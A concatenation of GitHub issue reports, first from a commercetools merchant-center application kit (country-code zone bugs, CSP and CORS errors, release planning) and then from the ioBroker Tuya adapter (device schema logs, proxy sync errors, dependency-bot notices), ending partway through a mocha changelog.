https://en.wikipedia.org/wiki/ISO_3166-1#Officially_assigned_code_elements
**To Reproduce**
Steps to reproduce the behavior:

1. Go to `settings` the `international` tab;
2. Click on edit icon in the zones pane;
3. Add `un-alt-short` in the `Country codes` column of any row.



**Expected behavior**
The zone to be updated


 There are some dependencies that require a breaking changes, in terms of version bump. Therefore, we should plan for a v15 release of appkit that includes all those changes.

- [x] eslint / eslint-airbnb #911 
- [x] react >= 16.9 #966 
- [x] @testing-library >= 9 #956 
- [x] apollo hooks #801 **Describe the bug**
Package @commercetools-frontend/l10n

Adding any of the [addedd countries](https://github.com/commercetools/merchant-center-application-kit/pull/988/files#diff-b9cfc7f2cdf78a7f4b91a753d10865a2) in  #988
 e.g `cg-alt-variant `, `un-alt-short `, ...`us-alt-short` in the zones
causes issue.
![issue](https://user-images.githubusercontent.com/7680511/64244358-2e4d8b80-cf09-11e9-99a0-199e8af7fc94.gif)
After checking the Graphql definition for the ZoneLocation
- ![image](https://user-images.githubusercontent.com/7680511/64244559-91d7b900-cf09-11e9-9ada-6a62f7f5c81d.png)
- ![image](https://user-images.githubusercontent.com/7680511/64244649-b764c280-cf09-11e9-86fe-0b541a8a551f.png)


So the supported codes are those
https://en.wikipedia.org/wiki/ISO_3166-1#Officially_assigned_code_elements
**To Reproduce**
Steps to reproduce the behavior:

1. Go to `settings` the `international` tab;
2. Click on edit icon in the zones pane;
3. Add `un-alt-short` in the `Country codes` column of any row.



**Expected behavior**
The zone to be updated


 I've deployed my custom application on server. Unfortunately my domain has been blocked by CORS policy.

I've set this domain in "**Application URL**" field in Merchant Center, but when I open my domain I've got redirecting loop with param `?**reason=unauthorized**`

I have the same domain set in **frontendHost** param in **env.prod.json** config file.

Is there something which I missing? I didn't set? WRT #214 

**Where would you like to deploy your custom application?**
- AWS S3
- Google Storage

**Additional context**
Most custom applications I've seen only need to load a static Single Page Application source code and don't need any server side routing. Only client side routing done within the Single Page Application is required.

While Google Storage offers the ability to "host a static site" there are many limitations that conflict with the current Custom Application bundling process. It's also not a cross platform feature that other clouds implement.

Here's what I think would be nice:

1. Merchant Center Proxy loads `index.html` from my storage bucket.
2. `index.html` loads other resources from bucket.
3. When I add paths off of the Custom Application path these should be a [`window.history.pushstate`](https://stackoverflow.com/questions/3338642/updating-address-bar-with-new-url-without-hash-or-reloading-the-page) event that changes the URL without kicking off any network activity.
4. CSP is defined either in the `index.html` or the configuration is collected from a "well known" file in my S3 bucket.

If it works well for AWS S3 then it will work across a plethora of Clouds as most offer a service that imitates the S3 API. **Describe the bug**

Drag and drop is laggy within `TabularModalPage`




**To Reproduce**
Steps to reproduce the behavior:

1. Go to `Products` >  `Any Product Details` > `Variant Details` > `Prices` **Tab**
2. Click on `Columns icon`
4. Move items to or from the columns.

**Expected behavior**
The should move smothely.

**Screenshots**

| Before refactoring to `TabularModalPage` | After refactoring to `TabularModalPage` |
| - | -| 
| ![wit-modal-container](https://user-images.githubusercontent.com/7680511/61619066-673de380-ac6e-11e9-88e8-3ae92db0a968.gif) | ![after-tabular-modal-page](https://user-images.githubusercontent.com/7680511/61619067-673de380-ac6e-11e9-91e0-6f9045ccb76b.gif) |


**Additional context**
This was introduced after theis https://github.com/commercetools/merchant-center-frontend/commit/a210ab340f49ea674ae93320e6386f493912f220 
 The compile-html script `--use-local-assets` option is being ignored. The culprit appears to be in `mc-html-template/lib/compile-html.js` on line 30, which references `options.useLocalAssets`. This key does not exist on `options` and should instead be `shouldUseLocalAssets`. **Describe the bug**
Application starter template throws an error

**To Reproduce**
Steps to reproduce the behavior:

1. Install the template using `create-mc-app`
2. Start the application
3. The browser opens with an error

<img width="1509" alt="screenshot 2019-03-05 at 15 10 18" src="https://user-images.githubusercontent.com/1110551/53811087-d08bb700-3f58-11e9-9966-e86d8b994b64.png">


**Expected behavior**
The application starter should render without errors The topic of being able to trigger `QuickAccess` has came up with regards to the new Welcome Screen.

The idea would be that, we can trigger `QuickAccess` on a button click, and when `QuickAccess` is triggered this way, it will display additional usage instructions like below

![quick-access](https://user-images.githubusercontent.com/2425013/51907225-7b430f80-23c6-11e9-83ff-bae12aa0ac3f.png)

What would the best way doing this? I came up with a few ideas.

* Simply fire a keydown event through JavaScript with some sort of custom property, and if this custom property is present, QuickAccess renders with these additional instructions
* Provide an API for triggering QuickAccess programatically, perhaps through ApplicationContext.

Any other ideas?
 #### Summary

Since the package `application-components` makes use of CSS in JS, it would make sense to add CSS linting to it. 

This was added to ui-kit in this [pull request](https://github.com/commercetools/ui-kit/pull/815)

It should be not too difficult to get this setup for app kit as well. We need to make sure we resolve stylelint to the new version though 😆  In the next major release I would like to go with first support for hooks, which will help us to ship less and more performant code.
Therefore, we should:
- support only react `>16.8.0`
- use hooks in the appkit packages implementations, easier to type as well
- I would also like to drop the HOC functions

We can maybe do the same in the upcoming uikit v10 and release both versions together.

Also maybe upgrade RTL.

Thoughts?

---
- [x] peer dependency react `>16.8` #795 
- [x] peer dependency react-redux `>7` #853 
- [ ] ~~(_check if it's worth it, otherwise deprecate it for now_) remove HOCs~~
- [x] (_optional_) use hooks in all appkit packages
- [x] (_optional_) use hooks for notifications #855 
- [x] (_optional_) use hooks for redux #852
- [x] (_optional_) use hooks for l10n #860 
- [x] (_optional_) upgrade to react-intl [v3](https://github.com/formatjs/react-intl/blob/master/docs/Upgrade-Guide.md) #799 #817 
- [ ] ~~(_optional_) upgrade to react-apollo~~ [v3](https://github.com/apollographql/react-apollo/tree/master/packages/hooks) #801
- [x] (_check the effort_) upgrade to latest RTL -> `@testing-library/react` #811 
- [x] upgrade ct enzyme-extensions dep in jest to latest (for the `renderProp`) #796 
- [x] (_optional_) rename assets files #834
- [x] peer dependency uikit `>10` #825
- [x] migrate uikit v10 breaking changes #825
- [x] remove IE11 specific polyfills and ponyfills #830
- [x] stop transpiling for IE 11 #836
- [x] remove vendorsToTranspile webpack option #829 
- [x] update `permissions` constants to match new permissions (e.g. `ManageProject` has been removed) #815 
- [x] deprecate `storage` package #828 
- [x] remove deprecated components: `ServicePageResponseLayout` #828  **Describe the bug**
With #289 we changed how the navigation menu is loaded. For instance, in production the menu configuration is fetched from a `/api/graphql` endpoint on the same domain of the frontend app, as a we have a proxy router between the LB and the applications.

In development though, we usually start the app directly, without the proxy router. To render the menu config of the specific application, we load the menu config from a local file, skipping the graphql request (as the endpoint does not exist).

However, when testing the production build locally like so:

```bash
NODE_ENV=production mc-http-server --csp=$(pwd)/csp.json --config=$(pwd)/env.json --use-local-assets
```

the application starts in "production" mode, triggering the non-existing graphql request.

**Expected behavior**
It should be possible to start the application locally in production mode without having the graphql request to error.

**Additional context**
One solution would be to check for the flag `servedByProxy` from the `env.json`, which usually indicates if the application runs behind the proxy or not.

A bit unrelated to the problem, but we might also want to look into manually putting the menu data into the cache when we don't fetch from the graphql endpoint, so that we can still make the graphql query which will only read from the cache.
 I've add dependency package, but when I try to use it I've got Content Security Policy error.

_EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: "script-src 'self' storage.googleapis.com/mc-production-eu/ storage.googleapis.com/mc-production-us/ www.googletagmanager.com/gtm.js www.google-analytics.com/analytics.js localhost:* 'unsafe-inline' localhost"._

Is there something what I missing?

I'm working on local environment, using `headers.json` file and I have `csp` param set.

**headers.json**
```
{
  "csp": {
    "script-src": ["localhost"],
    "connect-src": ["localhost"],
    "style-src": ["localhost"]
  }
}
```
 In applications that don't use react-select v1, it's weird to have to apply the css themselves. It would make more sense if it's done as part of the app kit.

I just refactored an app not to use react-select v1, and I tried to remove it, but broke the app as app kit is expecting it to be applied. Ever since we introduced the first iteration of the `ModalPage`, Percy has been considering every PR to be introducing this new page. We need to figure out why, and fix it, because now in App Kit Percy is not adding much value. **Describe the change**

The `@commercetools-frontned/assets` package currently contains assets with non semantic filenames. So files are called after where they are used `ProjectSuspended.svg` etc. This makes reuse hard as the filename already suggests a use case. Instead we could, as with icons in UIKIt, name files after what they are: `Hourglass.svg` for instance can be used for project suspension and pending initialization.

**Follow ups**

1. Come up with a clear naming policy with design /cc @filippobocik 
2. Implement the change and document the breaking change There is an error with this repository's Renovate configuration that needs to be fixed. As a precaution, Renovate will stop PRs until it is resolved.

Error type: undefined
 Our current CI flow is quite slow (~17min) as we are performing several sequential steps that take some time to finish.

If we move to CircleCI we can spread the jobs into parallel steps, which will decrease the time to execute a CI run.
<---------->
152377417
I bought a roller shutter wall swich from aliexpress. I tried to integrade it in io.broker. But it seems that that sheme is missing. I can't control the switch.
Here are the lines from the log file:
info: tuya.0 new Shema added for product type YWK0ZiumXZGkb8nj. Please send next line from logfile on disk to developer!
--
2019-04-21 17:36:31.772  - info:  tuya.0  {"schema":"[{\"mode\":\"rw\",\"code\":\"status\",\"name\":\"窗帘状态\",\"property\":{\"range\":[\"0\",\"1\",\"2\",\"3\"],\"type\":\"enum\"},\"id\":1,\"type\":\"obj\",\"desc\":\"开  关 暂停\"}]","schemaExt":"[]"}

 {"schema":"[{\"mode\":\"rw\",\"code\":\"Power\",\"name\":\"开关\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_power2\",\"id\":1,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"TempSet\",\"name\":\"目标温度\",\"property\":{\"unit\":\"℃\",\"min\":15,\"max\":30,\"scale\":0,\"step\":1,\"type\":\"value\"},\"iconname\":\"icon-dp_temp\",\"id\":2,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"Mode\",\"name\":\"模式\",\"property\":{\"range\":[\"0\",\"1\",\"2\"],\"type\":\"enum\"},\"iconname\":\"icon-dp_mode\",\"id\":4,\"type\":\"obj\",\"desc\":\"低档\\\\高档、ECO、\"},{\"mode\":\"rw\",\"code\":\"ChildLock\",\"name\":\"童锁\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_lock\",\"id\":6,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"ro\",\"code\":\"Countdown\",\"name\":\"倒计时剩余时间\",\"property\":{\"unit\":\"H\",\"min\":0,\"max\":12,\"scale\":0,\"step\":1,\"type\":\"value\"},\"iconname\":\"icon-dp_time\",\"id\":11,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"TimeSet\",\"name\":\"定时功能\",\"property\":{\"unit\":\"H\",\"min\":0,\"max\":12,\"scale\":0,\"step\":1,\"type\":\"value\"},\"id\":101,\"type\":\"obj\",\"desc\":\"\"}]","schemaExt":"[]"}
 Hier 2 neue Schema , danke.



tuya.0 | 2019-10-18 02:01:49.965 | info | {"schema":"[{\"mode\":\"rw\",\"code\":\"switch_1\",\"name\":\"开关\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_power2\",\"id\":1,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":
-- | -- | -- | --
tuya.0 | 2019-10-18 02:01:49.965 | info | new Shema added for product type ZnVGigq6xD5XXgO0. Please send next line from logfile on disk to developer!
tuya.0 | 2019-10-18 02:01:49.965 | info | {"schema":"[{\"mode\":\"rw\",\"code\":\"switch_1\",\"name\":\"排插开关1\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_power2\",\"id\":1,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code
tuya.0 | 2019-10-18 02:01:49.964 | info | new Shema added for product type SSJ3FnXaNsrwYYnF. Please send next line from logfile on disk to developer!

 I synced my devices a week ago without problems.

Today I added another switch and wanted to re-sync - same procedure as before - pressed the "Start proxy" button, connected to WiFi and manual proxy with my hosts IP and port 8888.
Switching sockets works fine in Tuya app, but after a few seconds I get an error "network connection error" in the Tuya app.

Any idea? Hi,
während der Proxy läuft und ich die Smart-Life-App starte erhalte ich folgende Fehle im Log:

Error: socket hang up at TLSSocket.onSocketClose (_tls_wrap.js:764:23) at TLSSocket.emit (events.js:203:15) at _handle.close (net.js:606:12) at Socket.done (_tls_wrap.js:388:7) at 

SSL-Proxy ERROR: Error: socket hang up

Die App meldet dabei "Das Netzwerk hat Verbindungsfehler Bitte überprüfen Sie das Netzwerk".
Zertifikat "NodeMITMProxyCA" ist installiert und Proxyeinstellungen (ioBroker-IP + Port 8888) in der WLAN-Verbindung sind gesetzt. Ich erhalte die Meldung sowohl auf ipad als auch iphone (jeweils v13.1.2)

Alles was ich dazu finden konnte ist, dass exakt dieses Problem mit Aufspielen von v.3.0.2 gelöst werden konnte und die meisten Android nutzen. Ich bin blutiger Anfänger und da ich mit dem Problem offenbar ziemlich allein dastehe, suche ich den Fehler bei mir - ich kann ihn aber einfach nicht finden. Mehrfache Neuinstallation des Tuya-Adapters brachte keine Besserung.

Node.js: v10.16.3
NPM: 6.9.0
Auf Raspberry Pi 3b+ It would be great to add PIR sensors:

nfo: tuya.0 {"schema":"[{\"mode\":\"ro\",\"code\":\"PIR\",\"name\":\"PIR\",\"property\":{\"range\":[\"pir\"],\"type\":\"enum\"},\"id\":101,\"type\":\"obj\",\"desc\":\"pir 检测\"},{\"mode\":\"ro\",\"code\":\"battery\",\"name\":\"电池电量\",\"property\":{\"unit\":\"\",\"min\":0,\"max\":10000,\"scale\":0,\"step\":1,\"type\":\"value\"},\"id\":103,\"type\":\"obj\",\"desc\":\"mcu 上报电池电量\"}]","schemaExt":"[]"}

would be great. 
## The dependency [qrcode](https://github.com/soldair/node-qrcode) was updated from `1.4.0` to `1.4.1`.

🚨 [View failing branch](https://github.com/Apollon77/ioBroker.tuya/compare/master...Apollon77:greenkeeper%2Fqrcode-1.4.1).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




qrcode is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **continuous-integration/appveyor/branch:** Waiting for AppVeyor build to complete ([Details](https://ci.appveyor.com/project/Apollon77/iobroker-tuya/builds/26049654)).
- ❌ **continuous-integration/travis-ci/push:** The Travis CI build could not complete due to an error ([Details](https://travis-ci.org/Apollon77/ioBroker.tuya/builds/560040494?utm_source=github_status&utm_medium=notification)).
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 2 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/soldair/node-qrcode/commit/87d17979f8023b77e2b3173ff7d40980cc0a717c"><code>87d1797</code></a> <code>1.4.1</code></li>
<li><a href="https://urls.greenkeeper.io/soldair/node-qrcode/commit/a8ebc8344cfc549cd653ebc864ee4bb99fd364e4"><code>a8ebc83</code></a> <code>removing console.log</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/soldair/node-qrcode/compare/24ec7d4f70201207628d604c2cc9428ec53c2649...87d17979f8023b77e2b3173ff7d40980cc0a717c">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 Hi, ich habe 2 Nedis SmartLife IP Cams,

https://nedis.de/de-de/product/sicherheit-uberwachung/smart-home/uberwachung/550680692/wlan-smart-ip-kamera-hd-720p

Kann man von denen den Stream direkt in ioBroker einbauen?

hier der Auszug aus dem Logfile:

2019-12-13 23:14:03.807  - [32minfo[39m: tuya.0 (2830) new Schema added for product type pyhfiskiif5lzwax. Please send next line from logfile on disk to developer!
2019-12-13 23:14:03.807  - [32minfo[39m: tuya.0 (2830) {"schema":"[{\"mode\":\"rw\",\"code\":\"basic_indicator\",\"name\":\"状态指示灯\",\"property\":{\"type\":\"bool\"},\"id\":101,\"type\":\"obj\",\"desc\":\"设备设置页面-基本功能设置\\n设备指示灯是否打开，true打开，false关闭\"},{\"mode\":\"rw\",\"code\":\"basic_flip\",\"name\":\"画面翻转\",\"property\":{\"type\":\"bool\"},\"id\":103,\"type\":\"obj\",\"desc\":\"设备设置页面-基本功能设置\\n使直播画面垂直翻转，true打开翻转，false关闭翻转\"},{\"mode\":\"rw\",\"code\":\"basic_osd\",\"name\":\"时间水印\",\"property\":{\"type\":\"bool\"},\"id\":104,\"type\":\"obj\",\"desc\":\"设备设置页面-基本功能设置\\n时间水印功能开关，true打开水印，false关闭水印\"},{\"mode\":\"rw\",\"code\":\"motion_sensitivity\",\"name\":\"移动侦测灵敏度\",\"property\":{\"range\":[\"0\",\"1\",\"2\"],\"type\":\"enum\"},\"id\":106,\"type\":\"obj\",\"desc\":\"0-2，灵敏度依次增加；仅为灵敏度，0并不是关闭移动侦测报警；规定0为低灵敏度，1为中灵敏度，2为高灵敏度。\"},{\"mode\":\"rw\",\"code\":\"basic_nightvision\",\"name\":\"红外夜视\",\"property\":{\"range\":[\"0\",\"1\",\"2\"],\"type\":\"enum\"},\"id\":108,\"type\":\"obj\",\"desc\":\"0:自动\\n1:关\\n2:开\"},{\"mode\":\"ro\",\"code\":\"sd_storge\",\"name\":\"获取存储卡容量\",\"property\":{\"type\":\"string\",\"maxlen\":255},\"id\":109,\"type\":\"obj\",\"desc\":\"示例：\\n---2017.07.08更新---\\n单位改为kb\\n---\\n3503775744|778977280|2718158848\\n其中第一字符串是总容量，第二个字符串是已使用的容量，第三个是剩余容量\"},{\"mode\":\"ro\",\"code\":\"sd_status\",\"name\":\"存储卡状态\",\"property\":{\"unit\":\"\",\"min\":1,\"max\":5,\"scale\":1,\"step\":1,\"type\":\"value\"},\"id\":110,\"type\":\"obj\",\"desc\":\"status：sd卡状态，1-正常，2-异常，3-空间不足，4-正在格式化，5-无SD卡；\"},{\"mode\":\"rw\",\"code\":\"sd_format\",\"name\":\"存储卡格式化\",\"property\":{\"type\":\"bool\"},\"id\":111,\"type\":\"obj\",\"desc\":\"无参数\"},{\"mode\":\"rw\",\"code\":\"motion_timer_setting\",\"name\":\"移动侦测定时设置\",\"property\":{\"type\":\"string\",\"maxlen\":255},\"id\":114,\"type\":\"obj\",\"desc\":\"t_start:开始时间；t_end:结束时间。多个时间由\\\";\\\"分隔\"},{\"mode\":\"ro\",\"code\":\"movement_detect_pic\",\"name\":\"移动侦测\",\"id\":115,\"type\":\"raw\",\"desc\":\"该功能实现请参考SDK\\n---------------\\n{\\\"dp_id\\\",\\\"bucket;object;key\\\"}/{\\\"dp_id\\\",\\\"bucket;object;\\\"}\\n\\nbucket:根文件夹；objcet:文件路径；key:加密\"},{\"mode\":\"ro\",\"code\":\"sd_format_state\",\"name\":\"格式化状态\",\"property\":{\"unit\":\"\",\"min\":-20000,\"max\":20000,\"scale\":1,\"step\":1,\"type\":\"value\"},\"id\":117,\"type\":\"obj\",\"desc\":\"返回错误码：\\n-2000：SD卡正在格式化\\n-2001：SD卡格式化异常\\n-2002：无SD卡\\n-2003：SD卡错误\\n\\n//正数为格式化进度\"},{\"mode\":\"rw\",\"code\":\"motion_switch\",\"name\":\"移动报警开关\",\"property\":{\"type\":\"bool\"},\"id\":134,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"motion_timer_switch\",\"name\":\"移动侦测-模式选择\",\"property\":{\"type\":\"bool\"},\"id\":135,\"type\":\"obj\",\"desc\":\"true为定时移动侦测，false为全天移动侦测\"},{\"mode\":\"rw\",\"code\":\"record_switch\",\"name\":\"SD卡录像-开关\",\"property\":{\"type\":\"bool\"},\"id\":150,\"type\":\"obj\",\"desc\":\"设备设置页面-存储卡设置\\nSD卡录像开关，true为打开，false为关闭\\n功能关闭时，不录像到SD卡\"},{\"mode\":\"rw\",\"code\":\"record_mode\",\"name\":\"SD卡录像-模式选择\",\"property\":{\"range\":[\"1\",\"2\"],\"type\":\"enum\"},\"id\":151,\"type\":\"obj\",\"desc\":\"设备设置页面-存储卡设置\\nSD卡录像模式选择，1为事件录像（检测到移动再录像到SD卡），2为连续录像\"}]","schemaExt":"[]"}
2019-12-13 23:14:04.111  - [32minfo[39m: tuya.0 (2830) bf949d4cea5ab4cee2btq0: None of the discovered devices matches :-( It seems that the adapter is not stopped correctly while updating through the admin-panel of iobroker.

host.iobroker | 2019-12-01 17:32:54.434 | warn | instance system.adapter.tuya.0 already running with pid 10224

After updating the adapter turns yellow or red in some cases, pausing and restarting the adapter it will turn green.

 Would be beautifull to have this avaiable.

tuya.0 {"schema":"[{\"mode\":\"rw\",\"code\":\"switch\",\"name\":\"开关\",\"property\":{\"type\":\"bool\"},\"id\":1,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"temperature_c\",\"name\":\"温度\",\"property\":{\"unit\":\"°C\",\"min\":0,\"max\":37,\"scale\":0,\"step\":1,\"type\":\"value\"},\"id\":2,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"temperature_f\",\"name\":\"华氏温度\",\"property\":{\"unit\":\"°F\",\"min\":32,\"max\":99,\"step\":1,\"type\":\"value\"},\"id\":3,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"exchange\",\"name\":\"华氏摄氏度切换\",\"property\":{\"type\":\"bool\"},\"id\":4,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"ro\",\"code\":\"c_temperature\",\"name\":\"实际摄氏温度\",\"property\":{\"unit\":\"°C\",\"min\":0,\"max\":50,\"step\":1,\"type\":\"value\"},\"id\":5,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"ro\",\"code\":\"f_temperature\",\"name\":\"实际华氏温度\",\"property\":{\"unit\":\"°F\",\"min\":32,\"max\":122,\"step\":1,\"type\":\"value\"},\"id\":6,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"appoint\",\"name\":\"预约\",\"property\":{\"unit\":\"m\",\"min\":0,\"max\":1440,\"range\":[0,60,120,180,240,300,360,420,480,540,600,660,720,780,840,900,960,1020,1080,1140,1200,1260,1320,1380,1440],\"step\":1,\"type\":\"value\"},\"id\":7,\"type\":\"obj\",\"passive\":true,\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"appoint_flag\",\"name\":\"预约标志位\",\"property\":{\"type\":\"bool\"},\"id\":8,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"TimerData\",\"name\":\"周程序\",\"id\":9,\"type\":\"raw\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"smartTimer\",\"name\":\"定时\",\"property\":{\"range\":[\"holiday\",\"program\"],\"type\":\"enum\"},\"id\":10,\"type\":\"obj\",\"desc\":\"\"}]","schemaExt":"[]"} Ich habe heute erfolgreich meine Klimaanlage mit diesem Adapter in Iobroker integrieren können

es handelt sich um eine
TCL XA21 / TAC-12CHSD

aber ich denke es wird genauso mit den nahezu baugleichen Geräten XA51, XA71, XA91 funktionieren

Folgende info aus dem log;
`

new Shema added for product type 2si3Y6O3K2rK9XBr. Please send next line from logfile on disk to developer!
--
2019-08-04 11:30:15.676 - info: tuya.0 {"schema":"[{\"mode\":\"rw\",\"code\":\"Power\",\"name\":\"开关\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_power\",\"id\":1,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"temp_set\",\"name\":\"温度调节\",\"property\":{\"unit\":\"℃\",\"min\":0,\"max\":99,\"scale\":0,\"step\":1,\"type\":\"value\"},\"iconname\":\"icon-dp_temp\",\"id\":2,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"ro\",\"code\":\"temp_current\",\"name\":\"当前温度\",\"property\":{\"unit\":\"℃\",\"min\":-20,\"max\":100,\"scale\":0,\"step\":1,\"type\":\"value\"},\"iconname\":\"icon-dp_sun\",\"id\":3,\"type\":\"obj\",\"desc\":\"\"},{\"mode\":\"rw\",\"code\":\"mode\",\"name\":\"模式\",\"property\":{\"range\":[\"auto\",\"cold\",\"hot\",\"wet\",\"wind\"],\"type\":\"enum\"},\"iconname\":\"icon-dp_mode\",\"id\":4,\"type\":\"obj\",\"desc\":\"auto：自动模式(feel)；cold：制冷模式；hot：制热模式；wet：除湿模式；wind：送风模式\"},{\"mode\":\"rw\",\"code\":\"windspeed\",\"name\":\"风量\",\"property\":{\"range\":[\"1\",\"2\",\"3\",\"4\"],\"type\":\"enum\"},\"iconname\":\"icon-dp_wind\",\"id\":5,\"type\":\"obj\",\"desc\":\"1：高；2：中；3：低；4：自动\"},{\"mode\":\"rw\",\"code\":\"mode_ECO\",\"name\":\"经济模式\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-eco\",\"id\":8,\"type\":\"obj\",\"desc\":\"ECO模式\"},{\"mode\":\"ro\",\"code\":\"Fault\",\"scope\":\"fault\",\"name\":\"故障告警\",\"property\":{\"label\":[\"E0\",\"E1\",\"E2\",\"E3\",\"E4\",\"E6\",\"E7\",\"E8\",\"E9\",\"EA\",\"EF\",\"EU\"],\"type\":\"bitmap\",\"maxlen\":12},\"iconname\":\"icon-dp_warming\",\"id\":20,\"type\":\"obj\",\"desc\":\"E0:室内外电控板通信故障;E1:室内环境温度传感器故障;E2:室内盘管温度传感器故障;E3:室外盘管温度传感器故障;E4:系统缺氟;E6:室内电机故障或内机风扇不转;E7:室外环境温度传感器故障;E8:室外排气温度传感器故障;E9:室外IPM变频模块故障/压缩机驱动故障;EA:室外电流传感器故障;EF:室外直流风机故障;EU:室外电压传感器故障（电源电压）\"},{\"mode\":\"rw\",\"code\":\"sleep\",\"name\":\"睡眠模式\",\"property\":{\"type\":\"bool\"},\"iconname\":\"icon-dp_sleep\",\"id\":101,\"type\":\"obj\",\"desc\":\"睡眠（SLEEP）\"},{\"mode\":\"rw\",\"code\":\"turbo\",\"name\":\"强力模式\",\"property\":{\"type\":\"bool\"},\"id\":102,\"type\":\"obj\",\"desc\":\"强力（TURBO）\"},{\"mode\":\"rw\",\"code\":\"cf\",\"name\":\"温标切换\",\"property\":{\"type\":\"bool\"},\"id\":103,\"type\":\"obj\",\"desc\":\"温标切换，true是华氏度，fasle是摄氏度\"},{\"mode\":\"rw\",\"code\":\"wind_up\",\"name\":\"上下摆风\",\"property\":{\"type\":\"bool\"},\"id\":104,\"type\":\"obj\",\"desc\":\"上下摆风\"},{\"mode\":\"rw\",\"code\":\"wind_left\",\"name\":\"左右摆风\",\"property\":{\"type\":\"bool\"},\"id\":105,\"type\":\"obj\",\"desc\":\"左右摆风\"}]","schemaExt":"[{\"id\":2,\"inputStyle\":\"\",\"inputType\":\"\"},{\"id\":3,\"inputStyle\":\"\",\"inputType\":\"\"}]"}

`
aber auch so kann ich soweit bereits alles steuern
Grüße
Downset 
## The devDependency [mocha](https://github.com/mochajs/mocha) was updated from `6.0.2` to `6.1.0`.

🚨 [View failing branch](https://github.com/Apollon77/ioBroker.tuya/compare/master...Apollon77:greenkeeper%2Fmocha-6.1.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




mocha is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **continuous-integration/travis-ci/push:** The Travis CI build failed ([Details](https://travis-ci.org/Apollon77/ioBroker.tuya/builds/516884697?utm_source=github_status&utm_medium=notification)).
</details>


---

<details>
<summary>Release Notes for v6.1.0</summary>

<h1>6.1.0 / 2019-04-07</h1>
<h2><g-emoji class="g-emoji" alias="lock" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f512.png">🔒</g-emoji> Security Fixes</h2>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3845" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3845/hovercard">#3845</a>: Update dependency "js-yaml" to v3.13.0 per npm security advisory (<a href="https://urls.greenkeeper.io/plroebuck"><strong>@plroebuck</strong></a>)</li>
</ul>
<h2><g-emoji class="g-emoji" alias="tada" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png">🎉</g-emoji> Enhancements</h2>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3766" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3766/hovercard">#3766</a>: Make reporter constructor support optional <code>options</code> parameter (<a href="https://urls.greenkeeper.io/plroebuck"><strong>@plroebuck</strong></a>)</li>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3760" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3760/hovercard">#3760</a>: Add support for config files with <code>.jsonc</code> extension (<a href="https://urls.greenkeeper.io/sstephant"><strong>@sstephant</strong></a>)</li>
</ul>
<h2><g-emoji class="g-emoji" alias="fax" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f4e0.png">📠</g-emoji> Deprecations</h2>
<p>These are <em>soft</em>-deprecated, and will emit a warning upon use. Support will be removed in (likely) the next major version of Mocha:</p>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3719" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3719/hovercard">#3719</a>: Deprecate <code>this.skip()</code> for "after all" hooks (<a href="https://urls.greenkeeper.io/juergba"><strong>@juergba</strong></a>)</li>
</ul>
<h2><g-emoji class="g-emoji" alias="bug" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f41b.png">🐛</g-emoji> Fixes</h2>
<ul>
<li><a href="https://urls.greenkeeper.io/mochajs/mocha/issues/3829" data-hovercard-type="pull_request" data-hovercard-url="/mochajs/mocha/pull/3829/hovercard">#3829</a>: Use cwd-relative pathname to load config file (<a href="https://urls.greenkeeper.io/plroebuck"><strong>@plroebuck</strong></a>)</li>
